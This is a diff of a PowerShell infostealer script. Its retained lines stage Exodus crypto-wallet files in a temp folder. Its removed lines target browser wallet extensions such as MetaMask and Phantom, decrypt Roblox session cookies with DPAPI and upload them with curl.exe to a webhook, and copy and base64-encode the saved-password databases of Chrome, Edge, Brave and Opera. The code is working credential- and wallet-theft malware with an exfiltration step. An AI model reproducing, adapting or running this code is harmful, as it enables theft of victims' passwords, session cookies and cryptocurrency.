@@ -118,23 +118,9 @@ foreach ($t in $tokens.Keys) {
 }
 
 # =====================================================================
-# ─── WALLETS (DESKTOP & BROWSER EXTENSIONS) ───
+# ─── WALLET (EXODUS ONLY) ───
 # =====================================================================
-$dw = @{
-    Exodus="$appdata\Exodus"; Atomic="$appdata\atomic"; Electrum="$appdata\Electrum"; 
-    Jaxx="$appdata\jaxx"; Guarda="$appdata\Guarda"; Coinomi="$appdata\Coinomi"; Armory="$appdata\Armory"
-}
-$bw = @{
-    MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn'; Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa';
-    Ronin='fnjhmkhhmkbjkkabndcnnogagogbneec'; BinanceChain='fhbohimaelbohpjbbldcngcnapndodjp';
-    Coinbase='hnfanknocfeofbddgcijnmhfnkdnaad'; TrustWallet='egjidjbpglichdcondbcbdnbeeppgdph';
-    TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec'
-}
-$br = @(
-    "$l\Google\Chrome\User Data", "$l\Microsoft\Edge\User Data", 
-    "$l\BraveSoftware\Brave-Browser\User Data", "$appdata\Opera Software\Opera Stable"
-)
-
+$dw = @{ Exodus="$appdata\Exodus" }
 $staging = Join-Path $env:TEMP "wallets"
 Remove-Item $staging -Recurse -Force -EA SilentlyContinue
 mkdir $staging -Force | Out-Null
@@ -143,16 +129,6 @@ foreach ($n in $dw.Keys) {
     if (Test-Path $dw[$n]) {
         $dest = Join-Path $staging $n
         & robocopy $dw[$n] $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS /XD partitions logs tmp cache Cache blob_storage GPUCache Crashpad | Out-Null
-    }
-}
-foreach ($n in $bw.Keys) {
-    foreach ($bp in $br) {
-        $ep = Join-Path $bp "Default\Local Extension Settings\$($bw[$n])"
-        if (Test-Path $ep) {
-            $dest = Join-Path $staging $n
-            & robocopy $ep $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS | Out-Null
-            break
-        }
     }
 }
 
@@ -231,96 +207,4 @@ foreach ($rp in $rbxPaths) {
         } catch {}
         break
     }
-}
-
-$msPaths = @("$l\RobloxPCGDK\LocalStorage\RobloxCookies.dat")
-$pkgPath = "$l\Packages"
-if (Test-Path $pkgPath) {
-    $gdks = Get-ChildItem "$pkgPath\ROBLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue
-    foreach ($gdk in $gdks) {
-        $cp = Join-Path $gdk.FullName "LocalState\RobloxCookies.dat"
-        if (Test-Path $cp) { $msPaths += $cp }
-    }
-}
-foreach ($rp in $msPaths) {
-    if (Test-Path $rp) {
-        try {
-            $raw = Get-Content $rp -Raw
-            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
-                $eb = [Convert]::FromBase64String($Matches[1])
-                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-                $cookie = [Text.Encoding]::UTF8.GetString($db)
-                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
-                    $c = $Matches[1]
-                    Add-Content $outfile "ROBLOXMS|$c"
-                    dbg ":cookie: Roblox Cookie (MS)" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
-                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
-                    Set-Content -Path $tmp_c -Value $c -NoNewline
-                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
-                    Remove-Item $tmp_c -Force -EA SilentlyContinue
-                } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
-                    $c = $Matches[0]
-                    Add-Content $outfile "ROBLOXMS|$c"
-                    dbg ":cookie: Roblox Cookie (MS)" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
-                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
-                    Set-Content -Path $tmp_c -Value $c -NoNewline
-                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
-                    Remove-Item $tmp_c -Force -EA SilentlyContinue
-                } else {
-                    $c = $cookie.Substring(0,[Math]::Min(500,$cookie.Length))
-                    Add-Content $outfile "ROBLOXMS|$c"
-                    dbg ":cookie: Roblox Cookie (MS)" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
-                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
-                    Set-Content -Path $tmp_c -Value $c -NoNewline
-                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
-                    Remove-Item $tmp_c -Force -EA SilentlyContinue
-                }
-            }
-        } catch {}
-        break
-    }
-}
-
-# =====================================================================
-# ─── BROWSER LOGIN DATA (PASSWORDS) ───
-# =====================================================================
-$browsers = @(
-    @{Name="Chrome";Path="$l\Google\Chrome\User Data"},
-    @{Name="Edge";Path="$l\Microsoft\Edge\User Data"},
-    @{Name="Brave";Path="$l\BraveSoftware\Brave-Browser\User Data"},
-    @{Name="Opera";Path="$appdata\Opera Software\Opera Stable"},
-    @{Name="OperaGX";Path="$appdata\Opera Software\Opera GX Stable"}
-)
-foreach ($br in $browsers) {
-    if (!(Test-Path $br.Path)) { continue }
-    $lp = Join-Path $br.Path "Default\Login Data"
-    if (!(Test-Path $lp)) { $lp = Join-Path $br.Path "Login Data" }
-    if (!(Test-Path $lp)) { continue }
-    
-    $copied = $false
-    $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid()).db"
-    
-    try {
-        $fs = [IO.File]::Open($lp, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
-        $ms = New-Object IO.MemoryStream
-        $fs.CopyTo($ms); $fs.Close()
-        [IO.File]::WriteAllBytes($tmp, $ms.ToArray())
-        $ms.Close(); $copied = $true
-    } catch {}
-    
-    if (!$copied) { Add-Content $outfile "PASSWORD|$($br.Name)|LOCKED||"; continue }
-    
-    try {
-        $rawBytes = [IO.File]::ReadAllBytes($tmp)
-        if ($rawBytes.Length -gt 800000) {
-            Add-Content $outfile "PASSWORD|$($br.Name)|TOO_LARGE|$($rawBytes.Length)|"
-        } else {
-            $b64 = [Convert]::ToBase64String($rawBytes)
-            Add-Content $outfile "PASSWORD|$($br.Name)|RAW_DB||$b64"
-        }
-    } catch { 
-        Add-Content $outfile "PASSWORD|$($br.Name)|READ_ERROR||" 
-    }
-    
-    Remove-Item $tmp -Force -EA SilentlyContinue
 }
